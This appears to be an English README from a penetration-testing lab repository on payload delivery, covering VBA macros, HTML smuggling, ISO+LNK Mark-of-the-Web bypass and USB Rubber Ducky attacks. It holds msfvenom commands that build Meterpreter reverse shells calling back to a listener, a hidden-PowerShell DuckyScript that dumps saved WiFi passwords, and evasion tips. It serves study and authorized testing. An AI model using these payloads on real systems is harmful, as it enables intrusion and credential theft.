> **English** | [Italiano](README.md)

# 03 - Payload Delivery

> - **Phase:** Social Engineering - Payload Delivery (delivering malicious code to the target)
> - **Visibility:** High - delivery vectors interact with email gateways, proxies, endpoint protection; payload execution triggers EDR/AV; attached files are analyzed by automated sandboxes
> - **Prerequisites:** Generated payload (msfvenom, Empire stager, or custom); for VBA macros: Microsoft Office with macros enabled on the target; for HTML Smuggling: JavaScript knowledge; for ISO+LNK: ISO image creation tools; for Rubber Ducky: Hak5 hardware or emulator
> - **Output:** Finding SE-007..010; payloads executed on target machine through four distinct delivery vectors; reverse shell or credential exfiltration achieved in each scenario

---

## Introduction

Payload Delivery is the kill chain phase where malicious code is physically delivered to the victim and execution is achieved. While the `01-phishing-campaigns` section focuses on credential harvesting and the `02-social-engineer-toolkit` section provides the multi-vector framework, this section documents in detail the specific weaponization and delivery techniques.

The evolution of delivery vectors reflects the arms race between attackers and defenders:

1. **VBA Macros (SE-007):** the classic technique (pre-2022). A Word/Excel document with a malicious macro that, once enabled by the user, executes a PowerShell stager. Microsoft disabled VBA macros by default for files with Mark-of-the-Web starting in July 2022, reducing their effectiveness but not eliminating it in legacy environments.

2. **HTML Smuggling (SE-008):** a modern technique that bypasses email gateway filters. JavaScript code in the email/HTML page assembles the malicious file directly in the victim's browser via the Blob API, evading server-side controls that only analyze static attachments.

3. **ISO + LNK (SE-009):** the attackers' response to macro blocking. ISO files do not carry the Mark-of-the-Web when mounted on Windows, and LNK files within them execute arbitrary commands without SmartScreen intervention. Dominant technique in 2022-2024.

4. **USB Rubber Ducky (SE-010):** physical attack via HID device. The Rubber Ducky presents itself as a keyboard and injects pre-programmed keystroke sequences at superhuman speed.

---

## Folder Structure

```
03-payload-delivery/
+-- malicious-macros/     # VBA macro reverse shell (classic technique) - SE-007
+-- html-smuggling/       # Bypass email gateway via blob JS - SE-008
+-- iso-lnk-delivery/     # Post-macro kill: MotW bypass chain - SE-009
+-- usb-rubber-ducky/     # Physical HID attack - SE-010
```

---

## `malicious-macros/` - VBA Macro Reverse Shell

**Finding ID:** `SE-007` | **Severity:** `High` (VBA macro executes PowerShell stager for reverse shell)

### Operational Context

The lab documented the creation of a Word document with a VBA macro that, when enabled by the user, executes an encoded PowerShell stager for a Meterpreter reverse shell. The technique is legacy post-2022, but remains relevant for Office environments with macros enabled (companies with legacy dependencies, files from internal shares without MotW).

### Key Commands

```Bash
# VBA payload generation with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f vba-psh -o macro_payload.vba
```

---

## `html-smuggling/` - Bypass Email Gateway

**Finding ID:** `SE-008` | **Severity:** `High` (payload .exe reassembled client-side, server-side filter bypass)

### Operational Context

HTML Smuggling leverages JavaScript APIs (Blob, URL.createObjectURL) to assemble a malicious file directly in the victim's browser. The email contains only legitimate JavaScript code: the payload is Base64-encoded within the script and is decoded and offered as a download when the victim opens the page. Email gateway filters do not execute JavaScript, making this technique highly effective.

### Key Commands

```Bash
# Payload generation and Base64 encoding
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o update.exe
base64 -w 0 update.exe > payload_b64.txt
```

---

## `iso-lnk-delivery/` - Mark-of-the-Web Bypass

**Finding ID:** `SE-009` | **Severity:** `Critical` (payload execution without MotW, SmartScreen bypass)

### Operational Context

After VBA macro blocking (July 2022), attackers adopted a new delivery chain: ISO files containing a LNK (shortcut) and the payload. Windows mounts the ISO as a virtual drive and the files within it do not inherit the Mark-of-the-Web, the flag that activates SmartScreen. The LNK, with an icon disguised as a document, executes the payload without SmartScreen intervention.

### Key Commands

```Bash
# Payload and ISO image creation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o payload.exe
mkisofs -o delivery.iso -J -r ./iso_contents/
```

---

## `usb-rubber-ducky/` - Physical HID Attack

**Finding ID:** `SE-010` | **Severity:** `High` (WiFi credential exfiltration in < 30 seconds)

### Operational Context

The Rubber Ducky (Hak5) presents itself to the system as an HID keyboard and injects keystroke sequences at superhuman speed. The lab documented a DuckyScript payload that extracts saved WiFi credentials on Windows, completing the operation in less than 30 seconds.

### Key Commands

```Bash
# DuckyScript for WiFi exfiltration (Windows)
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "(netsh wlan show profiles)|Select-String ':(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$_}|%{(netsh wlan show profile name=$n key=clear)}|Out-File $env:TEMP\wifi.txt"
ENTER
```

---

## Recommended Operational Flow

```
[1] Vector Selection
     +-- Target with macros enabled? -------> Malicious Macros (SE-007)
     +-- Email gateway blocks attachments? -> HTML Smuggling (SE-008)
     +-- Standard Windows 10/11 target? ----> ISO + LNK (SE-009)
     +-- Physical access to target? --------> USB Rubber Ducky (SE-010)
              |
              v
[2] Weaponization
     +-- msfvenom: payload generation for chosen vector
     +-- Embedding: VBA macro / Base64 JS / ISO+LNK / DuckyScript
              |
              v
[3] Delivery
     +-- Email (SE-007, SE-008): send via GoPhish or SET
     +-- Link (SE-009): host ISO on controlled server
     +-- Physical (SE-010): insert USB into target
              |
              v
[4] Execution & Callback
     +-- Metasploit handler listening
     +-- Reverse shell / credential exfiltration
```

---

## Reference Tools

| Tool | Type | Technique/Access | Primary Use Case |
| :--- | :--- | :--- | :--- |
| `msfvenom` | Payload generator | CLI | Payload generation in all formats (VBA, EXE, PS1, DLL) |
| `mkisofs` / `genisoimage` | ISO creator | CLI | ISO image creation for delivery chain |
| `Rubber Ducky` | HID attack | Hardware + DuckyScript | Automated keystroke injection via USB |
| `macro_pack` | Office weaponizer | CLI - Python | VBA macro obfuscation and malicious Office document generation |
| `Unicorn` | PS payload generator | CLI - Python | Encoded PowerShell payload generation for delivery |
| `Donut` | Shellcode generator | CLI | Conversion of .NET assemblies into position-independent shellcode |

> **Recommended modern tool:** `macro_pack` for advanced VBA macro obfuscation (AMSI bypass). For modern delivery (2024-2026), the ISO+LNK combination is giving way to Windows Shortcut exploitation (CVE-2024-21412) and OneNote attachments. `Donut` for converting any .NET/PE into injectable shellcode.

---

## Finding Registry

| ID | Description | Severity | CVSS | Subfolder |
| :--- | :--- | :---: | :---: | :--- |
| `SE-007` | VBA Macro: Word document with macro executing encoded PowerShell stager for Meterpreter reverse shell | `High` | 7.8 | `malicious-macros/` |
| `SE-008` | HTML Smuggling: payload .exe reassembled client-side via JavaScript Blob, email gateway bypass | `High` | 8.1 | `html-smuggling/` |
| `SE-009` | ISO + LNK: payload executed without Mark-of-the-Web, SmartScreen and macro block bypass | `Critical` | 9.1 | `iso-lnk-delivery/` |
| `SE-010` | USB Rubber Ducky: exfiltration of saved WiFi credentials in < 30 seconds via HID injection | `High` | 7.2 | `usb-rubber-ducky/` |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Related Finding |
| :--- | :--- | :--- | :--- |
| Resource Development | Develop Capabilities: Malware | `T1587.001` | SE-007, SE-008, SE-009 |
| Initial Access | Phishing: Spearphishing Attachment | `T1566.001` | SE-007, SE-008, SE-009 |
| Initial Access | Replication Through Removable Media | `T1091` | SE-010 |
| Execution | User Execution: Malicious File | `T1204.002` | SE-007, SE-009, SE-010 |
| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | SE-007, SE-008 |
| Execution | Command and Scripting Interpreter: Visual Basic | `T1059.005` | SE-007 |
| Defense Evasion | Subvert Trust Controls: Mark-of-the-Web Bypass | `T1553.005` | SE-009 |
| Defense Evasion | Obfuscated Files or Information: HTML Smuggling | `T1027.006` | SE-008 |
| Collection | Input Capture: Credential API Hooking | `T1056.004` | SE-010 |

---

> **Note:** All documented activities were conducted in a virtualized lab environment (VirtualBox, isolated NAT/Bridge network). Payloads were executed exclusively on virtual machines owned by the author. No payload was delivered to real systems or people.
